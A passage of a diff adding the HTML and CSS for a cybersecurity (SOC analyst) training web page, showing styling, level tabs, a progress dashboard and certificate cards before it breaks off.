@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Analyst Training — CCA Solutions</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Exo+2:wght@300;400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#060a12;--bg2:#0a1020;--bg3:#0d1628;
+  --panel:#0f1a2e;--panel2:#111f38;
+  --border:#1a3050;--border2:#1e3a5f;
+  --cyan:#00d4ff;--cyan2:#00a8cc;
+  --green:#00ff88;--green2:#00cc66;
+  --amber:#ffb300;--amber2:#e6a000;
+  --red:#ff3d5a;--purple:#7b4fff;
+  --text:#c8dff0;--text2:#7a9ab8;--text3:#4a6a88;
+  --l1:#00d4ff;--l2:#7b4fff;--l3:#ff3d5a;
+  --glow-cyan:0 0 20px rgba(0,212,255,0.4);
+  --glow-green:0 0 20px rgba(0,255,136,0.4);
+  --glow-purple:0 0 20px rgba(123,79,255,0.4);
+  --glow-red:0 0 20px rgba(255,61,90,0.4);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;min-height:100vh;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,212,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px);pointer-events:none;z-index:1;}
+
+/* HERO */
+.hero{position:relative;z-index:10;text-align:center;padding:50px 20px 30px;overflow:hidden;}
+.hero-bg{position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(0,212,255,0.08) 0%,transparent 70%);pointer-events:none;}
+.badge{display:inline-block;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:3px;color:var(--cyan);border:1px solid var(--cyan);padding:5px 16px;margin-bottom:16px;animation:fadeDown .6s ease both;}
+.hero h1{font-family:'Rajdhani',sans-serif;font-size:clamp(2rem,5vw,3.6rem);font-weight:700;letter-spacing:2px;line-height:1.1;animation:fadeDown .7s ease .1s both;}
+.hero h1 span{color:var(--cyan);}
+.hero p{font-size:1rem;color:var(--text2);max-width:600px;margin:14px auto 0;line-height:1.7;font-weight:300;animation:fadeDown .7s ease .2s both;}
+
+/* TOP NAV TABS */
+.tabs{position:relative;z-index:10;display:flex;justify-content:center;gap:10px;padding:24px 20px 0;flex-wrap:wrap;}
+.tab{font-family:'Rajdhani',sans-serif;font-size:0.95rem;font-weight:600;letter-spacing:2px;padding:9px 24px;border:1px solid var(--border2);background:var(--panel);color:var(--text2);cursor:pointer;transition:all .3s;clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);}
+.tab:hover{color:var(--text);border-color:var(--cyan);}
+.tab.active-l1{background:rgba(0,212,255,0.12);color:var(--cyan);border-color:var(--cyan);box-shadow:var(--glow-cyan);}
+.tab.active-l2{background:rgba(123,79,255,0.12);color:var(--purple);border-color:var(--purple);box-shadow:var(--glow-purple);}
+.tab.active-l3{background:rgba(255,61,90,0.12);color:var(--red);border-color:var(--red);box-shadow:var(--glow-red);}
+.tab.active-dash{background:rgba(0,255,136,0.1);color:var(--green);border-color:var(--green);box-shadow:var(--glow-green);}
+
+/* MAIN */
+.main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:28px 20px 60px;}
+.level-panel{display:none;animation:fadeIn .4s ease;}
+.level-panel.active{display:block;}
+
+/* SECTION HEADER */
+.section-header{display:flex;align-items:center;gap:16px;margin-bottom:28px;padding-bottom:14px;border-bottom:1px solid var(--border);}
+.level-tag{font-family:'Share Tech Mono',monospace;font-size:0.72rem;letter-spacing:2px;padding:4px 12px;border:1px solid;}
+.l1 .level-tag{color:var(--l1);border-color:var(--l1);background:rgba(0,212,255,0.08);}
+.l2 .level-tag{color:var(--l2);border-color:var(--l2);background:rgba(123,79,255,0.08);}
+.l3 .level-tag{color:var(--l3);border-color:var(--l3);background:rgba(255,61,90,0.08);}
+.section-header h2{font-family:'Rajdhani',sans-serif;font-size:1.7rem;font-weight:700;letter-spacing:1px;}
+
+/* SUB TABS */
+.sub-tabs{display:flex;gap:4px;margin-bottom:22px;border-bottom:1px solid var(--border);overflow-x:auto;}
+.sub-tab{font-family:'Share Tech Mono',monospace;font-size:0.72rem;letter-spacing:1.5px;padding:10px 18px;background:none;border:none;color:var(--text3);cursor:pointer;transition:all .2s;white-space:nowrap;border-bottom:2px solid transparent;margin-bottom:-1px;}
+.sub-tab:hover{color:var(--text);}
+.sub-tab.active{color:var(--cyan);border-bottom-color:var(--cyan);}
+.l2 .sub-tab.active{color:var(--purple);border-bottom-color:var(--purple);}
+.l3 .sub-tab.active{color:var(--red);border-bottom-color:var(--red);}
+.content-pane{display:none;}
+.content-pane.active{display:block;animation:fadeIn .3s ease;}
+
+/* MODULE GRID */
+.module-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:14px;}
+.module-card{background:var(--panel);border:1px solid var(--border);padding:18px;position:relative;overflow:hidden;transition:border-color .3s,transform .2s;cursor:pointer;}
+.module-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;}
+.l1 .module-card::before{background:var(--l1);}
+.l2 .module-card::before{background:var(--l2);}
+.l3 .module-card::before{background:var(--l3);}
+.module-card:hover{border-color:var(--border2);transform:translateY(-2px);}
+.module-card.completed{border-color:rgba(0,255,136,0.3);background:rgba(0,255,136,0.03);}
+.module-card.completed::after{content:'✓ COMPLETE';position:absolute;top:12px;right:12px;font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--green);letter-spacing:1px;}
+.module-num{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--text3);letter-spacing:2px;margin-bottom:6px;}
+.module-card h3{font-family:'Rajdhani',sans-serif;font-size:1.05rem;font-weight:600;letter-spacing:1px;margin-bottom:8px;}
+.module-card p{font-size:0.83rem;color:var(--text2);line-height:1.6;margin-bottom:12px;}
+.topic-list{list-style:none;display:flex;flex-direction:column;gap:4px;}
+.topic-list li{font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--text2);padding-left:14px;position:relative;}
+.topic-list li::before{content:'▸';position:absolute;left:0;color:var(--text3);}
+.l1 .topic-list li::before{color:var(--l1);}
+.l2 .topic-list li::before{color:var(--l2);}
+.l3 .topic-list li::before{color:var(--l3);}
+.module-footer{margin-top:12px;padding-top:10px;border-top:1px solid var(--border);display:flex;gap:14px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--text3);}
+.mark-btn{margin-top:12px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:1.5px;padding:6px 14px;border:1px solid var(--border2);background:none;color:var(--text3);cursor:pointer;transition:all .2s;}
+.mark-btn:hover{border-color:var(--green);color:var(--green);}
+.mark-btn.done{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.06);}
+
+/* VIDEO SECTION */
+.video-section{margin-bottom:28px;}
+.video-section-title{font-family:'Share Tech Mono',monospace;font-size:0.7rem;letter-spacing:2px;color:var(--text3);margin-bottom:14px;}
+.video-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;}
+.video-card{background:var(--panel);border:1px solid var(--border);overflow:hidden;transition:border-color .3s;}
+.video-card:hover{border-color:var(--border2);}
+.video-embed-wrap{position:relative;padding-bottom:56.25%;height:0;overflow:hidden;background:var(--bg3);}
+.video-embed-wrap iframe{position:absolute;top:0;left:0;width:100%;height:100%;border:none;}
+.video-placeholder{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;cursor:pointer;background:var(--bg3);border:none;width:100%;}
+.video-placeholder-icon{font-size:2.5rem;opacity:.5;}
+.video-placeholder-text{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:2px;color:var(--text3);}
+.video-url-input{display:flex;gap:8px;padding:10px 12px;border-top:1px solid var(--border);background:var(--bg3);}
+.video-url-input input{flex:1;background:var(--bg);border:1px solid var(--border2);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.72rem;padding:6px 10px;outline:none;}
+.video-url-input input:focus{border-color:var(--cyan);}
+.video-url-input input::placeholder{color:var(--text3);}
+.video-url-btn{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:1px;padding:6px 14px;border:1px solid var(--cyan);background:rgba(0,212,255,0.08);color:var(--cyan);cursor:pointer;transition:all .2s;white-space:nowrap;}
+.video-url-btn:hover{background:rgba(0,212,255,0.18);}
+.video-meta{padding:10px 12px;}
+.video-meta-title{font-family:'Rajdhani',sans-serif;font-size:0.9rem;font-weight:600;letter-spacing:.5px;margin-bottom:3px;}
+.video-meta-sub{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--text3);letter-spacing:1px;}
+
+/* SLIDES */
+.slide-container{background:var(--panel);border:1px solid var(--border);position:relative;overflow:hidden;min-height:460px;display:flex;flex-direction:column;}
+.slide-topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:var(--bg3);border-bottom:1px solid var(--border);}
+.slide-dots{display:flex;gap:6px;}
+.slide-dots span{width:10px;height:10px;border-radius:50%;background:var(--border2);display:block;}
+.slide-dots span:nth-child(1){background:var(--red);}
+.slide-dots span:nth-child(2){background:var(--amber);}
+.slide-dots span:nth-child(3){background:var(--green);}
+.slide-title-bar{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--text3);letter-spacing:2px;}
+.slide-content{flex:1;display:flex;flex-direction:column;justify-content:center;padding:36px 40px;}
+.slide{display:none;animation:slideIn .5s ease;}
+.slide.active{display:flex;flex-direction:column;gap:18px;}
+.slide-eyebrow{font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:3px;}
+.l1 .slide-eyebrow{color:var(--l1);}
+.l2 .slide-eyebrow{color:var(--l2);}
+.l3 .slide-eyebrow{color:var(--l3);}
+.slide h2{font-family:'Rajdhani',sans-serif;font-size:clamp(1.3rem,3vw,2rem);font-weight:700;letter-spacing:1px;line-height:1.2;}
+.slide-body{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:6px;}
+@media(max-width:600px){.slide-body{grid-template-columns:1fr;}}
+.slide-point{display:flex;gap:12px;align-items:flex-start;padding:12px;background:var(--bg3);border:1px solid var(--border);animation:fadeIn .5s ease both;}
+.slide-point:nth-child(1){animation-delay:.1s;}
+.slide-point:nth-child(2){animation-delay:.2s;}
+.slide-point:nth-child(3){animation-delay:.3s;}
+.slide-point:nth-child(4){animation-delay:.4s;}
+.point-icon{font-size:1.3rem;flex-shrink:0;margin-top:2px;}
+.point-title{font-family:'Rajdhani',sans-serif;font-size:0.88rem;font-weight:600;letter-spacing:1px;margin-bottom:3px;}
+.point-desc{font-size:0.76rem;color:var(--text2);line-height:1.5;}
+.slide-nav{display:flex;align-items:center;justify-content:space-between;padding:11px 18px;background:var(--bg3);border-top:1px solid var(--border);}
+.slide-nav-btn{font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:2px;padding:7px 16px;background:none;border:1px solid var(--border2);color:var(--text2);cursor:pointer;transition:all .2s;}
+.slide-nav-btn:hover{border-color:var(--cyan);color:var(--cyan);}
+.slide-nav-btn:disabled{opacity:.3;cursor:default;}
+.slide-counter{font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--text3);}
+.slide-progress{display:flex;gap:5px;}
+.slide-pip{width:22px;height:3px;background:var(--border2);transition:background .3s;}
+.slide-pip.active{background:var(--cyan);}
+.l2 .slide-pip.active{background:var(--purple);}
+.l3 .slide-pip.active{background:var(--red);}
+
+/* LAB */
+.lab-container{display:grid;grid-template-columns:280px 1fr;gap:14px;}
+@media(max-width:700px){.lab-container{grid-template-columns:1fr;}}
+.lab-sidebar{background:var(--panel);border:1px solid var(--border);padding:0;overflow:hidden;}
+.lab-sidebar-header{background:var(--bg3);padding:11px 14px;border-bottom:1px solid var(--border);font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:2px;color:var(--text3);}
+.lab-scenario{padding:13px 14px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .2s;}
+.lab-scenario:hover{background:var(--bg3);}
+.lab-scenario.active{background:rgba(0,212,255,0.06);border-left:2px solid var(--cyan);}
+.l2 .lab-scenario.active{background:rgba(123,79,255,0.06);border-left-color:var(--purple);}
+.l3 .lab-scenario.active{background:rgba(255,61,90,0.06);border-left-color:var(--red);}
+.lab-scenario.lab-done{opacity:.6;}
+.lab-scenario.lab-done .scenario-name::after{content:' ✓';color:var(--green);}
+.scenario-num{font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--text3);letter-spacing:2px;margin-bottom:3px;}
+.scenario-name{font-family:'Rajdhani',sans-serif;font-size:0.88rem;font-weight:600;letter-spacing:.5px;}
+.scenario-tag{display:inline-block;font-family:'Share Tech Mono',monospace;font-size:0.58rem;letter-spacing:1px;padding:2px 6px;margin-top:4px;border:1px solid;}
+.tag-easy{color:var(--green);border-color:var(--green2);background:rgba(0,255,136,0.05);}
+.tag-med{color:var(--amber);border-color:var(--amber2);background:rgba(255,179,0,0.05);}
+.tag-hard{color:var(--red);border-color:var(--red);background:rgba(255,61,90,0.05);}
+.lab-main{display:flex;flex-direction:column;gap:10px;}
+.lab-brief{background:var(--panel);border:1px solid var(--border);padding:14px 18px;}
+.lab-brief-title{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:2px;color:var(--text3);margin-bottom:7px;}
+.lab-brief h3{font-family:'Rajdhani',sans-serif;font-size:1.05rem;font-weight:700;letter-spacing:1px;margin-bottom:7px;}
+.lab-brief p{font-size:0.8rem;color:var(--text2);line-height:1.6;}
+.lab-objectives{display:flex;flex-wrap:wrap;gap:5px;margin-top:9px;}
+.obj-tag{font-family:'Share Tech Mono',monospace;font-size:0.63rem;padding:3px 7px;background:var(--bg3);border:1px solid var(--border2);color:var(--text2);letter-spacing:1px;}
+.terminal{background:#030608;border:1px solid var(--border);font-family:'Share Tech Mono',monospace;font-size:0.8rem;flex:1;overflow:hidden;display:flex;flex-direction:column;}
+.terminal-bar{background:#0a0e14;padding:7px 13px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;}
+.term-dot{width:10px;height:10px;border-radius:50%;}
+.term-dot:nth-child(1){background:#ff5f57;}
+.term-dot:nth-child(2){background:#ffbd2e;}
+.term-dot:nth-child(3){background:#28c840;}
+.term-label{font-size:0.63rem;color:var(--text3);letter-spacing:2px;margin-left:5px;}
+.terminal-output{padding:14px;flex:1;overflow-y:auto;min-height:180px;max-height:260px;line-height:1.7;}
+.term-line{margin-bottom:2px;}
+.term-prompt{color:var(--green);}
+.term-cmd{color:var(--text);}
+.term-info{color:var(--cyan);}
+.term-warn{color:var(--amber);}
+.term-alert{color:var(--red);}
+.term-ok{color:var(--green);}
+.term-dim{color:var(--text3);}
+.terminal-input{display:flex;align-items:center;gap:8px;padding:9px 14px;border-top:1px solid var(--border);background:#030608;}
+.term-prompt-icon{color:var(--green);white-space:nowrap;}
+.term-input-field{flex:1;background:none;border:none;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.8rem;outline:none;}
+.lab-hint{font-size:0.72rem;color:var(--text3);padding:7px 11px;background:var(--panel);border:1px solid var(--border);font-family:'Share Tech Mono',monospace;}
+.lab-hint span{color:var(--amber);}
+
+/* QUIZ */
+.quiz-container{max-width:720px;}
+.quiz-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;}
+.quiz-score{font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--text2);letter-spacing:1px;}
+.quiz-score span{color:var(--green);font-size:1rem;}
+.quiz-card{background:var(--panel);border:1px solid var(--border);padding:24px;margin-bottom:14px;animation:fadeIn .3s ease;}
+.quiz-q-num{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--text3);letter-spacing:2px;margin-bottom:9px;}
+.quiz-question{font-family:'Rajdhani',sans-serif;font-size:1.1rem;font-weight:600;letter-spacing:.5px;margin-bottom:18px;line-height:1.4;}
+.quiz-options{display:flex;flex-direction:column;gap:7px;}
+.quiz-option{display:flex;align-items:center;gap:11px;padding:11px 14px;background:var(--bg3);border:1px solid var(--border);cursor:pointer;transition:all .2s;font-size:0.86rem;}
+.quiz-option:hover{border-color:var(--border2);background:var(--bg2);}
+.quiz-option.correct{border-color:var(--green);background:rgba(0,255,136,0.06);color:var(--green);}
+.quiz-option.wrong{border-color:var(--red);background:rgba(255,61,90,0.06);color:var(--red);}
+.quiz-option.disabled{pointer-events:none;}
+.opt-letter{font-family:'Share Tech Mono',monospace;font-size:0.68rem;width:21px;height:21px;border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.quiz-option.correct .opt-letter{border-color:var(--green);color:var(--green);}
+.quiz-option.wrong .opt-letter{border-color:var(--red);color:var(--red);}
+.quiz-explanation{margin-top:10px;padding:11px 14px;background:rgba(0,212,255,0.05);border-left:2px solid var(--cyan);font-size:0.8rem;color:var(--text2);line-height:1.6;display:none;}
+.quiz-explanation.show{display:block;animation:fadeIn .3s ease;}
+.quiz-btn{font-family:'Share Tech Mono',monospace;font-size:0.72rem;letter-spacing:2px;padding:10px 26px;border:1px solid var(--cyan);background:rgba(0,212,255,0.08);color:var(--cyan);cursor:pointer;transition:all .2s;margin-top:7px;}
+.quiz-btn:hover{background:rgba(0,212,255,0.15);box-shadow:var(--glow-cyan);}
+.quiz-complete{text-align:center;padding:36px;background:var(--panel);border:1px solid var(--border);display:none;}
+.quiz-complete.show{display:block;animation:fadeIn .5s ease;}
+.quiz-complete h3{font-family:'Rajdhani',sans-serif;font-size:1.9rem;font-weight:700;margin-bottom:7px;}
+.quiz-complete p{color:var(--text2);margin-bottom:18px;}
+.score-big{font-family:'Share Tech Mono',monospace;font-size:3rem;color:var(--green);margin:14px 0;}
+.cert-unlock-btn{font-family:'Share Tech Mono',monospace;font-size:0.72rem;letter-spacing:2px;padding:10px 28px;border:1px solid var(--green);background:rgba(0,255,136,0.1);color:var(--green);cursor:pointer;transition:all .2s;margin-top:10px;display:none;}
+.cert-unlock-btn.show{display:inline-block;}
+.cert-unlock-btn:hover{background:rgba(0,255,136,0.2);box-shadow:var(--glow-green);}
+
+/* ════ PROGRESS DASHBOARD ════ */
+.dash-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;}
+.dash-header h2{font-family:'Rajdhani',sans-serif;font-size:1.6rem;font-weight:700;letter-spacing:1px;}
+.reset-btn{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:2px;padding:7px 16px;border:1px solid var(--red);background:rgba(255,61,90,0.06);color:var(--red);cursor:pointer;transition:all .2s;}
+.reset-btn:hover{background:rgba(255,61,90,0.14);}
+.dash-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:28px;}
+@media(max-width:600px){.dash-grid{grid-template-columns:1fr;}}
+.dash-card{background:var(--panel);border:1px solid var(--border);padding:18px;position:relative;overflow:hidden;}
+.dash-card::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;}
+.dc-l1::after{background:var(--l1);}
+.dc-l2::after{background:var(--l2);}
+.dc-l3::after{background:var(--l3);}
+.dash-card h4{font-family:'Rajdhani',sans-serif;font-size:1rem;font-weight:600;letter-spacing:1px;margin-bottom:3px;}
+.dc-sub{font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--text3);letter-spacing:1.5px;margin-bottom:14px;}
+.dc-bar-wrap{background:var(--bg3);height:6px;width:100%;margin-bottom:8px;overflow:hidden;}
+.dc-bar{height:100%;transition:width .6s ease;}
+.dc-l1 .dc-bar{background:var(--l1);}
+.dc-l2 .dc-bar{background:var(--l2);}
+.dc-l3 .dc-bar{background:var(--l3);}
+.dc-stats{display:flex;justify-content:space-between;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--text3);}
+.dc-stats span:first-child{color:var(--text);}
+.activity-log{background:var(--panel);border:1px solid var(--border);margin-bottom:28px;}
+.activity-log-header{padding:11px 16px;background:var(--bg3);border-bottom:1px solid var(--border);font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:2px;color:var(--text3);}
+.activity-list{padding:0;max-height:220px;overflow-y:auto;}
+.activity-item{display:flex;align-items:center;gap:14px;padding:11px 16px;border-bottom:1px solid var(--border);font-size:0.82rem;}
+.activity-item:last-child{border-bottom:none;}
+.act-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.act-dot-quiz{background:var(--green);}
+.act-dot-lab{background:var(--cyan);}
+.act-dot-mod{background:var(--amber);}
+.act-time{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--text3);margin-left:auto;white-space:nowrap;}
+.no-activity{padding:24px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--text3);letter-spacing:2px;}
+.cert-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+@media(max-width:600px){.cert-grid{grid-template-columns:1fr;}}
+.cert-card{background:var(--panel);border:1px solid var(--border);padding:20px;text-align:center;position:relative;overflow:hidden;}
+.cert-card.locked{opacity:.5;}
+.cert-card.unlocked{border-color:rgba(0,255,136,0.4);}
+.cert-icon{font-size:2.2rem;margin-bottom:10px;}
+.cert-card h4{font-family:'Rajdhani',sans-serif;font-size:1rem;font-weight:700;letter-spacing:1px;margin-bottom:5px;}
+.cert-card p{font-size:0.75rem;color:var(--text2);margin-bottom:14px;}
+.cert-status{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:2px;padding:4px 10px;border:1px solid;display:inline-block;}
+.cert-status.locked-s{color:var(--text3);border-color:var(--border2);}
+.cert-status.unlocked-s{color:var(--green);border-color:var(--green);background:rgba(0,255,136,0.06);}
+.gen-cert-btn{display:none;width:100%;margin-top:10px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:1.5px;padding:8px;border:1px solid var(--cyan);background:rgba(0,212,255,0.08);color:var(--cyan);cursor:pointer;transition:all .2s;}
+.gen-cert-btn.show{display:block;}
+.gen-cert-btn:hover{background:rgba(0,212,255,0.18);}
+
+/* CERTIFICATE MODAL */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:1000;display:none;align-items:center;justify-content:center;padding:20px;}
+.modal-overlay.show{display:flex;}
+.modal-box{background:var(--bg2);border:1px solid var(--border2);max-width:760px;width:100%;max-height:90vh;overflow-y:auto;position:relative;}
+.modal-close{position:absolute;top:14px;right:14px;background:none;border:none;color:var(--text3);font-size:1.4rem;cursor:pointer;z-index:10;line-height:1;}
+.modal-close:hover{color:var(--text);}
+.cert-preview{padding:40px;background:var(--bg);}
+.cert-document{border:2px solid var(--border2);padding:40px;position:relative;background:var(--bg);text-align:center;}
+.cert-document::before{content:'';position:absolute;inset:8px;border:1px solid var(--border);pointer-events:none;}
+.cert-corner{position:absolute;width:20px;height:20px;border-color:var(--cyan);border-style:solid;}
+.cert-corner.tl{top:4px;left:4px;border-width:2px 0 0 2px;}
+.cert-corner.tr{top:4px;right:4px;border-width:2px 2px 0 0;}
+.cert-corner.bl{bottom:4px;left:4px;border-width:0 0 2px 2px;}
+.cert-corner.br{bottom:4px;right:4px;border-width:0 2px 2px 0;}
+.cert-logo{font-family:'Share Tech Mono',monospace;font-size:0.7rem;letter-spacing:3px;color:var(--cyan);margin-bottom:24px;}
+.cert-presents{font-family:'Share Tech Mono',monospace;font-size:0.65rem;letter-spacing:3px;color:var(--text3);margin-bottom:10px;}
+.cert-title{font-family:'Rajdhani',sans-serif;font-size:clamp(1.6rem,4vw,2.6rem);font-weight:700;letter-spacing:2px;line-height:1.2;margin-bottom:16px;}
+.cert-title span{color:var(--cyan);}
+.cert-name{font-family:'Rajdhani',sans-serif;font-size:clamp(1.1rem,3vw,1.8rem);font-weight:400;color:var(--text2);margin-bottom:20px;border-bottom:1px solid var(--border);padding-bottom:16px;}
+.cert-body-text{font-size:0.82rem;color:var(--text2);line-height:1.7;max-width:500px;margin:0 auto 24px;}
+.cert-level-badge{display:inline-block;font-family:'Share Tech Mono',monospace;font-size:0.75rem;letter-spacing:3px;padding:8px 24px;border:1px solid;margin-bottom:24px;}
+.cert-meta{display:flex;justify-content:center;gap:40px;margin-top:24px;padding-top:20px;border-top:1px solid var(--border);}
+.cert-meta-item{text-align:center;}
+.cert-meta-label{font-family:'Share Tech Mono',monospace;font-size:0.6rem;letter-spacing:2px;color:var(--text3);display:block;margin-bottom:4px;}
+.cert-meta-val{font-family:'Rajdhani',sans-serif;font-size:0.9rem;font-weight:600;}
+.cert-id{font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--text3);margin-top:18px;letter-spacing:2px;}
+.modal-actions{display:flex;gap:10px;padding:16px;border-top:1px solid var(--border);flex-wrap:wrap;}
+.modal-actions input{flex:1;min-width:160px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.75rem;padding:8px 12px;outline:none;}
+.modal-actions input:focus{border-color:var(--cyan);}
+.modal-act-btn{font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:1.5px;padding:8px 20px;cursor:pointer;transition:all .2s;border:1px solid;white-space:nowrap;}
+.btn-print{border-color:var(--cyan);background:rgba(0,212,255,0.08);color:var(--cyan);}
+.btn-print:hover{background:rgba(0,212,255,0.2);}
+.btn-cancel{border-color:var(--border2);background:none;color:var(--text2);}
+.btn-cancel:hover{border-color:var(--text2);}
+
+/* ANIMATIONS */
+@keyframes fadeDown{from{opacity:0;transform:translateY(-16px);}to{opacity:1;transform:translateY(0);}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+@keyframes slideIn{from{opacity:0;transform:translateX(20px);}to{opacity:1;transform:translateX(0);}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+@media(max-width:480px){.slide-content{padding:20px;}.lab-container{grid-template-columns:1fr;}}
+@media print{
+  body{background:#fff;color:#000;}
+  .modal-overlay{position:static;background:none;display:block;padding:0;}
+  .modal-box{border:none;max-height:none;}
+  .modal-close,.modal-actions{display:none;}
+  .cert-document{border-color:#ccc;background:#fff;}
+  .cert-document::before{border-color:#eee;}
+  .cert-corner{border-color:#888;}
+  .cert-title,.cert-title span,.cert-name{color:#000;}
+  .cert-logo{color:#0070b8;}
+  .cert-presents,.cert-meta-label,.cert-id{color:#888;}
+  .cert-body-text,.cert-meta-val{color:#333;}
+  .cert-level-badge{border-color:#0070b8;color:#0070b8;}
+}
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-bg"></div>
+  <div class="badge">CCA SOLUTIONS · CALGARY, CANADA</div>
+  <h1>SOC ANALYST<br><span>TRAINING PROGRAM</span></h1>
+  <p>From zero to security professional. Three levels. Real skills. No IT background required.</p>
+</div>
+
+<!-- MAIN TABS -->
+<div class="tabs">
+  <button class="tab active-dash" id="tab-dash" onclick="switchTop('dash',this)">◈ DASHBOARD</button>
+  <button class="tab" id="tab-l1" onclick="switchTop('l1',this)">◈ L1 — ANALYST</button>
+  <button class="tab" id="tab-l2" onclick="switchTop('l2',this)">◈ L2 — SPECIALIST</button>
+  <button class="tab" id="tab-l3" onclick="switchTop('l3',this)">◈ L3 — EXPERT</button>
+</div>
+
+<div class="main">
+
+<!-- ════════════ DASHBOARD ════════════ -->
+<div class="level-panel active" id="panel-dash">
+  <div class="dash-header">
+    <h2>YOUR PROGRESS</h2>
+    <button class="reset-btn" onclick="confirmReset()">⟳ RESET ALL</button>
+  </div>
+  <div class="dash-grid">
+    <div class="dash-card dc-l1">
+      <h4>SOC L1</h4><div class="dc-sub">THREAT IDENTIFICATION</div>
+      <div class="dc-bar-wrap"><div class="dc-bar" id="bar-l1" style="width:0%"></div></div>
+      <div class="dc-stats"><span id="stat-l1">0%</span><span>0/6 modules</span></div>
+    </div>
+    <div class="dash-card dc-l2">
+      <h4>SOC L2</h4><div class="dc-sub">ADVANCED ANALYSIS</div>
+      <div class="dc-bar-wrap"><div class="dc-bar" id="bar-l2" style="width:0%"></div></div>
+      <div class="dc-stats"><span id="stat-l2">0%</span><span>0/6 modules</span></div>
+    </div>
+    <div class="dash-card dc-l3">
+      <h4>SOC L3</h4><div class="dc-sub">RED TEAM & FORENSICS</div>
+      <div class="dc-bar-wrap"><div class="dc-bar" id="bar-l3" style="width:0%"></div></div>
+      <div class="dc-stats"><span id="stat-l3">0%</span><span>0/6 modules</span></div>
+    </div>
+  </div>
+
+  <div class="activity-log">
+    <div class="activity-log-header">// ACTIVITY LOG</div>
+    <div class="activity-list" id="activity-list"></div>
+  </div>
+
+  <div style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;letter-spacing:2px;color:var(--text3);margin-bottom:14px;">// CERTIFICATES</div>
+  <div class="cert-grid">
+    <div class="cert-card" id="cert-card-l1">
+      <div class="cert-icon">🏅</div>
+      <h4>L1 ANALYST</h4>
+      <p>Complete all 6 modules and pass the L1 assessment</p>
+      <div class="cert-status locked-s" id="cert-status-l1">LOCKED</div>
+      <button class="gen-cert-btn" id="cert-btn-l1" onclick="openCertModal('l1')">GENERATE CERTIFICATE</button>
+    </div>
+    <div class="cert-card" id="cert-card-l2">
+      <div class="cert-icon">🏅</div>
+      <h4>L2 SPECIALIST</h4>
+      <p>Complete all 6 modules and pass the L2 assessment</p>
